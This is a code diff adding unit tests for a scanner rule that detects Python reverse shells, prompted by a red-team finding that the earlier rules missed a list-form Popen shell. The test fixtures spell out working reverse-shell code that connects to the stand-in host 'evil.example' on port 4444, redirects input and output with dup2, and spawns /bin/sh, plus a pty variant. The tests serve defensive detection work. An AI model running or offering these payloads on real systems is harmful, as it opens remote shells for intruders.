@@ -392,3 +392,86 @@ describe('quality › red-flags › meta', () => {
     expect(v).toEqual([]);
   });
 });
+
+/**
+ * The socket form of a reverse shell.
+ *
+ * Red-team F-01 (2026-11-04): `C1-test-revshell` imported cleanly because every
+ * local rule missed it. `no_shell_string_execution` matches `os.system(...)` and
+ * `shell=True`; this payload uses neither — it passes `['/bin/sh', '-i']` as a
+ * list to `Popen`, which that rule deliberately exempts as the safe form. The
+ * deep scanner caught it as YARA `Python_Socket_Dup2_Shell`, so the gap only
+ * showed on a build without the deep scanner — exactly when the local red lines
+ * are the only defence.
+ */
+describe('quality › red-flags › no_socket_shell_attach', () => {
+  const REVERSHELL = [
+    'import socket, subprocess, os',
+    's = socket.socket(socket.AF_INET, socket.SOCK_STREAM)',
+    "s.connect(('evil.example', 4444))",
+    'os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1)',
+    "subprocess.Popen(['/bin/sh', '-i'])",
+  ].join('\n');
+
+  it('flags socket + dup2 + shell', () => {
+    const v = scanRedFlags({ content: REVERSHELL, kind: 'script', field: 'scripts/rev.py' });
+    const hit = v.find((x) => x.rule === 'no_socket_shell_attach');
+    expect(hit).toBeTruthy();
+    expect(hit!.level).toBe('EXTREME');
+  });
+
+  it('flags the pty variant', () => {
+    const v = scanRedFlags({
+      content: [
+        'import socket, pty, os',
+        's = socket.socket(); s.connect(("evil.example", 4444))',
+        "pty.spawn('/bin/bash')",
+      ].join('\n'),
+      kind: 'script', field: 'scripts/pty_shell.py',
+    });
+    expect(v.map((x) => x.rule)).toContain('no_socket_shell_attach');
+  });
+
+  it('does not flag an ordinary socket client', () => {
+    const v = scanRedFlags({
+      content: [
+        'import socket',
+        's = socket.socket(socket.AF_INET, socket.SOCK_STREAM)',
+        's.connect(("api.example.com", 443))',
+        'data = s.recv(4096)',
+      ].join('\n'),
+      kind: 'script', field: 'scripts/client.py',
+    });
+    expect(v.map((x) => x.rule)).not.toContain('no_socket_shell_attach');
+  });
+
+  it('does not flag a socket server that never attaches a shell', () => {
+    const v = scanRedFlags({
+      content: [
+        'import socketserver',
+        'class H(socketserver.BaseRequestHandler):',
+        '    def handle(self):',
+        '        self.request.sendall(b"ok")',
+      ].join('\n'),
+      kind: 'script', field: 'scripts/server.py',
+    });
+    expect(v.map((x) => x.rule)).not.toContain('no_socket_shell_attach');
+  });
+
+  it('demotes a comment that merely describes the pattern', () => {
+    const v = scanRedFlags({
+      content: '# a reverse shell looks like: socket.socket + os.dup2 + /bin/sh\nprint(1)\n',
+      kind: 'script', field: 'scripts/notes.py',
+    });
+    const hit = v.find((x) => x.rule === 'no_socket_shell_attach');
+    expect(hit?.level).not.toBe('EXTREME');
+  });
+
+  it('is python-only', () => {
+    const v = scanRedFlags({
+      content: 'const s = socket.socket(); os.dup2(1); spawn("/bin/sh")',
+      kind: 'script', field: 'scripts/rev.js',
+    });
+    expect(v.map((x) => x.rule)).not.toContain('no_socket_shell_attach');
+  });
+});
